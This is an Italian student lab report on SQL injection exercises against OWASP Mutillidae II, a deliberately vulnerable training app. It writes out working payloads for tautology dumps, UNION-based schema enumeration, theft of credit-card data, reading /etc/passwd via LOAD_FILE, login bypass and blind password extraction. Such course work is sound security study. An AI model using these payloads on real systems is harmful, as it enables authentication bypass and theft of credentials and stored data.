# Relazione – Esercitazione SQL Injection

## Introduzione

Questa esercitazione è dedicata all'analisi e allo sfruttamento delle vulnerabilità SQL Injection all'interno della piattaforma OWASP Mutillidae II. Si tratta di un'applicazione web vulnerabile, sviluppata per finalità didattiche, che permette di simulare e studiare scenari di attacco comuni in un ambiente controllato e legale.

L'obiettivo dell'esercitazione è acquisire dimestichezza con le principali tecniche di SQL Injection, comprendendone le implicazioni in termini di sicurezza e imparando a sfruttarle per accedere a dati riservati o compromettere l'autenticazione degli utenti.

Mutillidae è eseguibile tramite la macchina virtuale fornita dal corso e accessibile all’indirizzo:
```
http://127.0.0.1/mutillidae/
```

L’esercitazione si compone di sette esercizi di complessità crescente, elencati di seguito con una descrizione dettagliata delle tecniche utilizzate e dei risultati ottenuti.

---

# Esercizio 1 – Testare le vulnerabilità

Obiettivo: Effettuare semplici query SQL per verificare che l’applicazione web è vulnerabile a SQL Injection.

Inserendo un singolo apice (`'`) nel campo *username* si provoca un errore SQL, segno che l'applicazione è vulnerabile. Di seguito un estratto del messaggio di errore generato da Mutillidae:

| **Campo**              | **Valore**                                                                                                                                                                                                                                                |
|------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **File**               | /var/www/html/mutillidae/classes/MySQLHandler.php                                                                                                                                                                                                         |
| **Linea**              | 165                                                                                                                                                                                                                                                       |
| **Codice errore**      | 1064 – SQL syntax error                                                                                                                                                                                                                                   |
| **Query eseguita**     | SELECT * FROM accounts WHERE username=''' AND password='''                                                                                                                                                                                               |
| **Messaggio**          | You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''' AND password=''' at line 2                                                                                 |

---

# Esercizio 2 – Tautologia di base

Obiettivo: Sfruttare alcune tautologie di base per ottenere la lista degli utenti e le rispettive password.

Utilizzando la stringa `' OR 1=1 #` è possibile forzare la clausola WHERE a restituire sempre vero, ottenendo così la lista completa degli utenti.

Esempio:
```sql
' OR 1=1 #
```

Output (estratto):
```
Username=admin      Password=adminpass       Signature=g0t r00t?
Username=john       Password=monkey          Signature=I like the smell of confunk
...
```

---

# Esercizio 3 – Uso della UNION per recuperare altre informazioni

Obiettivo: Recuperare le informazioni delle carte di credito degli utenti tramite SQL Injection, ed eventualmente visualizzare il contenuto di file di sistema.

## 3.1 – Ottenere nomi tabelle e colonne

```sql
' UNION SELECT 1,table_schema,table_type,table_name,5,6,7 FROM information_schema.tables #
```

```sql
' UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_schema = "nowasp" AND table_name = "credit_cards" #
```

## 3.2 – Esfiltrazione dati sensibili

```sql
' UNION SELECT ccid,ccnumber,ccv,expiration,5,6,7 FROM credit_cards #
```

Output (interessante):
```
Username=1234567812345678
Password=627
Signature=2018-11-01
```

## 3.3 – Lettura file locali

```sql
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5,6,7 FROM credit_cards #
```

Output:
```
Username=root:x:0:0:root:/root:/bin/bash ...
```

---

# Esercizio 4 – Autenticazione

Obiettivo: Autenticarsi senza inserire credenziali valide.

Esempio:
```sql
admin' #
```

La query diventa:
```sql
SELECT username FROM accounts WHERE username='admin' #';
```

Risultato:
```
Logged In Admin: admin (g0t r00t?)
```

---

# Esercizio 5 – Autenticazione con utente specifico

Obiettivo: Autenticarsi come un utente noto senza conoscere la password.

Dato che `scotty` è presente nel database (visto nell’esercizio 2), si può usare:
```sql
scotty' #
```

Risultato:
```
Logged In User: scotty (Scotty do)
```

---

# Esercizio 6 – Autenticazione Blind

Obiettivo: Determinare la password dell’utente `john` tramite tecniche di Blind SQL Injection.

## Passaggi:

1. **Verifica della lunghezza**:
```sql
john' AND LENGTH(password) = 9 #
```

2. **Estrazione carattere per carattere**:
```sql
john' AND SUBSTRING(password, 1, 1) = 'm' #
```

3. **Automazione tramite script Python**

È stato realizzato uno script (`blind_sqli_merged.py`) che:
- Calcola la baseline della risposta per un caso falso;
- Individua tutte le lunghezze compatibili con l’utente;
- Estrae la password con tecnica blind a prefisso;
- Supporta la presenza di più utenti con stesso nome tramite `LIMIT 1 OFFSET n`.

Esecuzione tipica:
```bash
python3 blind_sqli_merged.py -U http://127.0.0.1/mutillidae/index.php?page=login.php -u john -m 50 -v
```

---

# Esercizio 7 – Creazione pagina PHP

[Da completare: questo esercizio richiede la creazione di una pagina PHP personalizzata.]

---

